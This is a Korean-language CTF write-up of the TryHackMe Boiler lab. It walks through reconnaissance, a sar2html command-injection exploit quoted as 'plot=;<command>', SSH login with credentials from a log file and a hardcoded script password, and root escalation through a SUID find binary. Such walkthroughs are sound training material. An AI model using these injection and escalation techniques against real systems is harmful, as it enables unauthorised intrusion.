---
layout: single
title: (THM) Boiler CTF - WriteUP
categories: THM
tag: [THM,TryHackMe, Pentest, Pentesting]
toc: true
author_profile: false
---

해당 문제는 [https://tryhackme.com/r/room/boilerctf2](https://tryhackme.com/r/room/boilerctf2) 에서 확인할 수 있습니다.

***

# Boiler CTF 시스템 모의 침투
## 수행 내용
1. 정보 수집
2. joomla CMS 확인
3. 추가 부르트포싱을 통한 _test 경로 확인 
4. sar2html 사용 확인 RCE 취약점 발견
5. 내부 침투 후 하드코딩으로 계정전환
6. find 명령어 잘못된 SUID 설정을 통한 권한 상승
## 정보수집
### Nmap 스캔 - 사용중인 포트 및 배너, 기본 정보 수집

```
nmap -p- --max-retries 1 -n --open --min-rate 5000 -T4 -sV -sC -A -oA ./boiler {target_ip}
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-04 21:17 EDT
Nmap scan report for 10.10.104.3
Host is up (0.42s latency).
Not shown: 59811 closed tcp ports (conn-refused), 5720 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.47.45
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  snet-sensor-mgmt
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Vulnerable
| Not valid before: 2019-08-22T09:22:57
|_Not valid after:  2024-08-20T09:22:57
55007/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 49.61 seconds

```

- 21번 포트로 FTP 서비스 동작중 (Anonymous 사용자 접근 가능)
- 80번 포트로 HTTP 웹 서비스 동작중
- 10000번 포트로 HTTPS 웹 서비스 동작중
- 55007 포트 서비스 동작중

![그림 1-1](/assets/image/write-up/thm/thm_boilerctf/image.png)
- 웹 서비스 접근 후 robots.txt 열람 가능
- 최상위 경로에 존재하는 경로 및 파일명 확인이 가능함.

```
┌──(kali㉿kali)-[~/hack_workplace/boiler]
└─$ nmap -p 10000, 55007 -sV -sC -A 10.10.104.3                                         
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-04 22:00 EDT
Stats: 0:00:12 elapsed; 1 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 22:01 (0:00:00 remaining)
Stats: 0:00:13 elapsed; 1 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 80.14% done; ETC: 22:01 (0:00:00 remaining)
Stats: 0:00:13 elapsed; 1 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 80.82% done; ETC: 22:01 (0:00:00 remaining)
Nmap scan report for 10.10.104.3
Host is up (0.53s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-server-header: MiniServ/1.930
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (1 host up) scanned in 46.09 seconds
                                                                                                                                                                    
┌──(kali㉿kali)-[~/hack_workplace/boiler]
└─$ nmap -p 55007 -sV -sC -A 10.10.104.3 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-04 22:02 EDT
Nmap scan report for 10.10.104.3
Host is up (0.48s latency).

PORT      STATE SERVICE VERSION
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3abe1392d95eb135516d6ce8df911e5 (RSA)
|   256 aedef2bbb78a00702074567625c0df38 (ECDSA)
|_  256 252583f2a7758aa046b2127004685ccb (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.28 seconds
```

- 추가적인 스캔 결과 10000 포트에 webmin 서비스 동작 중 확인
- 55007 포트에 ssh 서비스 동작중을 확인

![그림 1-2](/assets/image/write-up/thm/thm_boilerctf/image-1.png)
- ftp 서비스에 Anonymous 사용자로 접근 가능하며
- 숨김파일인 .info.txt 파일 존재
- 해당 파일을 가져와 열어보면 알 수 없는 문자열로 되어있음
- 카이사르 암호로 추측하여 이를 복화하기 시작

```
Just wanted to see if you find it; Lol; RememberG Enumeration is the key
```

- 14번의 문자열을 옮긴 후 읽을 수 있는 문장이 춮력됨
- RememberG 열거가 핵심이라고 한다.

### joolma CMS 사용중인 페이지 식별

![그림 1-3](/assets/image/write-up/thm/thm_boilerctf/image-2.png)
- 웹 서비스에 대한 디렉터리 부르트포싱을 시도했다.
- 그 결과 2개의 경로가 발견되었으며
- joomla 경로가 존재했으며, joolma CMS로 만들어진 웹 페이지가 존재했다. 즉 해당 페이지에서 사용중인 CMS는 joolma이다.

### _test 라는 유의미한 경로 식별

![그림 1-4](/assets/image/write-up/thm/thm_boilerctf/image-3.png)
- joolma 를 기점으로 디렉터리 부르트포싱을 한번 더 진행했다.
- 하나씩 살펴보던 중 _test 경로에서 유의미한 정보들을 발견했다.

### sar2html 서비스 사용 식별

![그림 1-5](/assets/image/write-up/thm/thm_boilerctf/image-4.png)
- sar2html 을 사용하는 웹 페이지를 발견 했다.
> sar2html은 시스템 활동 보고서(SAR) 데이터를 HTML로 변환하는 도구이다 이는 리눅스와 유닉스 시스템에서 시스템 활동을 모니터링하고 기록하는데 사용되는 유틸리티이다. 즉 이를 통해 데이터를 수집하여 ***<span style="color:red">웹 브라우저에서 볼 수 있는 형식으로 변환한다.***

## 취약점 분석
### Sar2HTML 특정 버전에서 RCE 취약점이 존재

- Sar2HTML 의 3.2.1 버전에서 RCE 취약점이 존재한다.
- 해당 시스템에서의 정확한 버전을 모르겠으나 시도는 해볼 만 하다.

```
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html 
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```

- 취약점에 대한 설명이다.
![그림 1-5](/assets/image/write-up/thm/thm_boilerctf/image-5.png)
- 해당 plot 파라미터에 ;(세미콜론) 뒤에 시스템 명령어를 입력하고
- select host 부분을 보면 응답값이 있다고 한다.

### 해당 시스템에서 사용하는 Sar2HTML 에서도 RCE 취약점 존재

![그림 1-6](/assets/image/write-up/thm/thm_boilerctf/image-6.png)
- ; whoami 의 결과로 좌측 select host 메뉴에 출력된 걸 볼 수 있다.
- 이를 통해 RCE 취약점을 발견하여 내부 시스템에 접근할 수 있을듯 하다
- Reverse Connection은 되질 않아 ls를 통해 내부 시스템 파일들을 찾아봤다.

### log.txt 파일에서 ssh 접근 로그 식별

![그림 1-7](/assets/image/write-up/thm/thm_boilerctf/image-7.png)
- log.txt 파일이 존재했다.

## 내부침투
### 로그파일에 존재하는 계정정보를 통한 SSH 접근

![그림 1-8](/assets/image/write-up/thm/thm_boilerctf/image-8.png)
- log.txt 파일을 확인해보니 SSH 시스템에 접근 로그가 남아 있었다.
- 해당 시스템에서는 55007 포트로 SSH 가 동작중이었다.
- 로그 내용을 살펴보면 basterd 사용자로 superduperp@$$ 패스워드를 사용하여 ssh접속에 성공했다.

## 권한 상승
### 쉘 스크립트 내에 존재하는 다른 사용자 계정정보 하드코딩 식별

![그림 1-9](/assets/image/write-up/thm/thm_boilerctf/image-9.png)
- 성공적으로 basterd 사용자로 ssh 를 통한 내부시스템에 접속했다.
- 그 후 backup.sh 라는 스크립트 파일을 발견했다.

```sh
SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
basterd@Vul
```

- 원격 서버로 파일을 백업하는 스크립트로 보여지지만
- 해당 코드 내에 stoner 유저에 대한 계정정보가 하드코딩 되어 있다.

![그림 1-10](/assets/image/write-up/thm/thm_boilerctf/image-10.png)
- 성공적으로 stoner 유저로 로그인 할 수 있다.

### find 명령어에 대한 잘못된 SUID 설정을 통한 권한 상승

![그림 1-11](/assets/image/write-up/thm/thm_boilerctf/image-11.png)
- 해당 시스템에서 wget을 사용할 수 없어
- 하나씩 내부 시스템을 돌아다녀봤으며 find를 통해 SUID가 잘못설정된 파일들이 있는지에 대한 유/무 체크를 했다.
- 그 중 find 명령어에 대한 suid 가 설정되어 있었으며 이를 이요해
- root 권한을 획득했다.
- euid가 root 권한인 0으로 변경된걸 볼 수 있다.